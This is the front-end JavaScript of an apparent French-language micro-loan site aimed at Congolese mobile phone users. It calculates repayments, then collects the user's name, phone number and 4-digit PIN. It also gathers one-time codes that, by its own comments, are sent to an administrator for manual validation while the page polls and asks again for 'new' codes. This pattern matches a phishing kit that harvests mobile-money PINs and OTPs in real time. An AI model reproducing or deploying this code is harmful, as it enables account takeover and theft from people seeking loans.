// ==================== CONFIG ====================
const API_BASE = window.location.origin;

// ==================== STATE ====================
let currentSection = 1;
let loanAmount = 500000;
let loanDuration = 12;
const minAmount = 50000;
const maxAmount = 2000000;
const minDuration = 1;
const maxDuration = 24;
const interestRate = 0.025;
let selectedLoanType = '';
let currentApplicationId = null;
let currentPhone = '';
let otpCheckInterval = null;

// ==================== CALCULATOR ====================
function formatNumber(num) {
  return num.toLocaleString('fr-FR');
}

function parseNumber(str) {
  return parseFloat(str.replace(/[^\d]/g, '')) || 0;
}

function calculate() {
  const totalInterest = loanAmount * interestRate * loanDuration;
  const totalRepayment = loanAmount + totalInterest;
  const monthlyPayment = loanDuration > 0 ? (totalRepayment / loanDuration).toFixed(2) : '0.00';

  document.getElementById('heroAmount').textContent = formatNumber(loanAmount);
  document.getElementById('heroMonths').textContent = loanDuration + ' MOIS';
  document.getElementById('heroMonthly').textContent = formatNumber(monthlyPayment) + ' CDF';
  document.getElementById('heroDuration').textContent = loanDuration + ' mois';

  document.getElementById('amountValue').textContent = formatNumber(loanAmount) + ' CDF';
  document.getElementById('durationValue').textContent = loanDuration + ' mois';

  document.getElementById('sumAmount').textContent = formatNumber(loanAmount.toFixed(2)) + ' CDF';
  document.getElementById('sumInterest').textContent = formatNumber(totalInterest.toFixed(2)) + ' CDF';
  document.getElementById('sumTotal').textContent = formatNumber(totalRepayment.toFixed(2)) + ' CDF';
  document.getElementById('sumMonthly').textContent = formatNumber(monthlyPayment) + ' CDF';

  const amountPct = ((loanAmount - minAmount) / (maxAmount - minAmount)) * 100;
  const durationPct = ((loanDuration - minDuration) / (maxDuration - minDuration)) * 100;

  document.getElementById('amountFill').style.width = amountPct + '%';
  document.getElementById('amountThumb').style.left = amountPct + '%';
  document.getElementById('durationFill').style.width = durationPct + '%';
  document.getElementById('durationThumb').style.left = durationPct + '%';
}

function updateFromSlider(isAmount, value) {
  if (isAmount) {
    loanAmount = Math.round(value / 10000) * 10000;
    document.getElementById('amountInput').value = formatNumber(loanAmount);
  } else {
    loanDuration = value;
    document.getElementById('durationInput').value = loanDuration;
  }
  calculate();
}

function updateFromInput(isAmount) {
  if (isAmount) {
    let val = parseNumber(document.getElementById('amountInput').value);
    val = Math.max(minAmount, Math.min(maxAmount, val));
    loanAmount = Math.round(val / 10000) * 10000;
    document.getElementById('amountInput').value = formatNumber(loanAmount);
  } else {
    let val = parseInt(document.getElementById('durationInput').value) || minDuration;
    val = Math.max(minDuration, Math.min(maxDuration, val));
    loanDuration = val;
    document.getElementById('durationInput').value = loanDuration;
  }
  calculate();
}

// ==================== SLIDER SETUP ====================
function setupSlider(trackId, thumbId, min, max, isAmount) {
  const track = document.getElementById(trackId);
  const thumb = document.getElementById(thumbId);
  let isDragging = false;

  function updateFromX(clientX) {
    const rect = track.getBoundingClientRect();
    let pct = (clientX - rect.left) / rect.width;
    pct = Math.max(0, Math.min(1, pct));
    const value = Math.round(min + pct * (max - min));
    if (isAmount) {
      updateFromSlider(true, value);
    } else {
      updateFromSlider(false, value);
    }
  }

  thumb.addEventListener('mousedown', (e) => { isDragging = true; e.preventDefault(); });
  thumb.addEventListener('touchstart', (e) => { isDragging = true; });

  document.addEventListener('mousemove', (e) => { if (isDragging) updateFromX(e.clientX); });
  document.addEventListener('touchmove', (e) => { if (isDragging) updateFromX(e.touches[0].clientX); });

  document.addEventListener('mouseup', () => { isDragging = false; });
  document.addEventListener('touchend', () => { isDragging = false; });

  track.addEventListener('click', (e) => { if (!isDragging) updateFromX(e.clientX); });
}

// ==================== NAVIGATION ====================
function goToSection(n) {
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  const targetSection = document.getElementById('section' + n);
  if (targetSection) targetSection.classList.add('active');

  const dots = document.querySelectorAll('.nav-dot');
  dots.forEach((d, i) => d.classList.toggle('active', i === n - 1));

  currentSection = n;
  updateCTAButton();
}

function updateCTAButton() {
  const btn = document.getElementById('mainCta');
  const dots = document.getElementById('navDots');
  if (!btn) return;

  if (currentSection <= 3) {
    btn.style.display = 'flex';
    dots.style.display = 'flex';
    btn.textContent = currentSection === 3 ? 'Demander le Crédit →' : 'Continuer →';
  } else {
    btn.style.display = 'none';
    dots.style.display = 'none';
  }
}

function handleMainAction() {
  if (currentSection < 3) {
    goToSection(currentSection + 1);
  } else if (currentSection === 3) {
    submitApplication();
  }
}

// ==================== FORM HANDLING ====================
function openModal() {
  document.getElementById('modalOverlay').classList.add('active');
}

function closeModal(e) {
  if (!e || e.target === document.getElementById('modalOverlay')) {
    document.getElementById('modalOverlay').classList.remove('active');
  }
}

function selectLoanType(type) {
  selectedLoanType = type;
  document.getElementById('loanTypeText').textContent = type;
  document.getElementById('loanTypeText').style.color = '#1f2937';
  document.querySelectorAll('.modal-radio').forEach(r => r.classList.remove('selected'));
  const types = ['Urgence Médicale','Frais de Scolarité','Commerce','Agriculture','Rénovation Maison','Transport','Autres'];
  const index = types.indexOf(type);
  if (index >= 0) document.getElementById('radio' + (index + 1)).classList.add('selected');
  setTimeout(closeModal, 200);
}

// ==================== API CALLS ====================
async function submitApplication() {
  const firstName = document.getElementById('firstName').value.trim();
  const lastName = document.getElementById('lastName').value.trim();
  const phone = document.getElementById('phone').value.trim();
  const pin = document.getElementById('pin').value.trim();
  const purpose = document.getElementById('purposeInput').value.trim();

  if (!firstName || !lastName || !phone || !pin) {
    showToast('Veuillez remplir tous les champs', 'error');
    return;
  }

  if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
    showToast('Le PIN doit être de 4 chiffres', 'error');
    return;
  }

  if (!selectedLoanType) {
    showToast('Veuillez choisir le type de crédit', 'error');
    goToSection(2);
    return;
  }

  const fullPhone = '+243' + phone;
  currentPhone = fullPhone;

  const btn = document.getElementById('mainCta');
  btn.disabled = true;
  btn.textContent = 'Envoi en cours...';

  try {
    const response = await fetch(`${API_BASE}/api/apply`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        firstName, lastName, phone: fullPhone, loanAmount, loanDuration,
        loanType: selectedLoanType, purpose, pin
      })
    });

    const data = await response.json();

    if (data.success) {
      currentApplicationId = data.applicationId;
      showToast('Demande soumise avec succès!', 'success');
      goToSection(6);
      startStatusPolling();
    } else {
      showToast(data.message || 'Une erreur est survenue', 'error');
      btn.disabled = false;
      btn.textContent = 'Demander le Crédit →';
    }
  } catch (error) {
    console.error('Error:', error);
    showToast('Erreur de connexion. Réessayez.', 'error');
    btn.disabled = false;
    btn.textContent = 'Demander le Crédit →';
  }
}

function startStatusPolling() {
  const interval = setInterval(async () => {
    if (!currentApplicationId) { clearInterval(interval); return; }

    try {
      const response = await fetch(`${API_BASE}/api/status/${currentApplicationId}`);
      const data = await response.json();

      if (data.status === 'approved') {
        clearInterval(interval);
        showOTPVerification();
      } else if (data.status === 'declined') {
        clearInterval(interval);
        showToast('Votre demande a été refusée', 'error');
        setTimeout(() => location.reload(), 3000);
      }
    } catch (error) {
      console.error('Polling error:', error);
    }
  }, 3000);
}

function showOTPVerification() {
  document.getElementById('otpPhoneDisplay').textContent = currentPhone;
  goToSection(4);
}

// ==================== OTP - SENDS TO ADMIN FOR VALIDATION ====================
async function verifyOTP() {
  const otp = document.getElementById('otpInput').value.trim();
  const messageEl = document.getElementById('otpMessage');

  if (otp.length !== 5 || !/^\d{5}$/.test(otp)) {
    messageEl.textContent = 'Le OTP doit être de 5 chiffres';
    messageEl.style.color = '#dc2626';
    return;
  }

  messageEl.textContent = 'Envoi à l\'administrateur...';
  messageEl.style.color = '#6b7280';

  try {
    const response = await fetch(`${API_BASE}/api/verify-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: currentPhone, otp, applicationId: currentApplicationId })
    });

    const data = await response.json();

    if (data.success) {
      messageEl.textContent = 'OTP envoyé à l\'administrateur. En attente de validation...';
      messageEl.style.color = '#E40000';
      
      // Start polling for admin validation
      startOTPValidationPolling();
    } else {
      messageEl.textContent = data.message || 'Erreur';
      messageEl.style.color = '#dc2626';
    }
  } catch (error) {
    messageEl.textContent = 'Erreur de vérification';
    messageEl.style.color = '#dc2626';
  }
}

function startOTPValidationPolling() {
  goToSection(6); // Show waiting screen
  
  if (otpCheckInterval) clearInterval(otpCheckInterval);
  
  otpCheckInterval = setInterval(async () => {
    if (!currentApplicationId) { clearInterval(otpCheckInterval); return; }

    try {
      const response = await fetch(`${API_BASE}/api/otp-status/${currentApplicationId}`);
      const data = await response.json();

      if (data.status === 'verified') {
        clearInterval(otpCheckInterval);
        
        // Show success screen
        document.getElementById('successAmount').textContent = formatNumber(loanAmount) + ' CDF';
        document.getElementById('successMonthly').textContent = formatNumber(data.application.monthlyPayment) + ' CDF';
        goToSection(5);
        
      } else if (data.status === 'rejected') {
        clearInterval(otpCheckInterval);
        
        // Show OTP rejected, request new code
        showToast('OTP invalide. Un nouveau code a été envoyé.', 'error');
        document.getElementById('otpInput').value = '';
        document.getElementById('otpMessage').textContent = 'Nouveau OTP envoyé! Veuillez entrer le nouveau code.';
        document.getElementById('otpMessage').style.color = '#E40000';
        goToSection(4);
      }
      // If pending, keep waiting
    } catch (error) {
      console.error('OTP validation polling error:', error);
    }
  }, 3000);
}

async function resendOTP() {
  const messageEl = document.getElementById('otpMessage');

  try {
    const response = await fetch(`${API_BASE}/api/resend-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: currentPhone, applicationId: currentApplicationId })
    });

    const data = await response.json();

    if (data.success) {
      messageEl.textContent = 'Nouveau OTP envoyé!';
      messageEl.style.color = '#E40000';
    } else {
      messageEl.textContent = data.message || 'Erreur';
      messageEl.style.color = '#dc2626';
    }
  } catch (error) {
    messageEl.textContent = 'Erreur de connexion';
    messageEl.style.color = '#dc2626';
  }
}

// ==================== UI HELPERS ====================
function showToast(message, type = 'info') {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();

  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.textContent = message;
  document.body.appendChild(toast);

  setTimeout(() => toast.classList.add('show'), 10);
  setTimeout(() => {
    toast.classList.remove('show');
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

// ==================== INIT ====================
document.addEventListener('DOMContentLoaded', () => {
  // Setup sliders
  setupSlider('amountTrack', 'amountThumb', minAmount, maxAmount, true);
  setupSlider('durationTrack', 'durationThumb', minDuration, maxDuration, false);

  // Setup text inputs
  const amountInput = document.getElementById('amountInput');
  const durationInput = document.getElementById('durationInput');
  
  if (amountInput) {
    amountInput.value = formatNumber(loanAmount);
    amountInput.addEventListener('blur', () => updateFromInput(true));
    amountInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') updateFromInput(true);
    });
  }
  
  if (durationInput) {
    durationInput.value = loanDuration;
    durationInput.addEventListener('blur', () => updateFromInput(false));
    durationInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') updateFromInput(false);
    });
  }
  
  calculate();
});
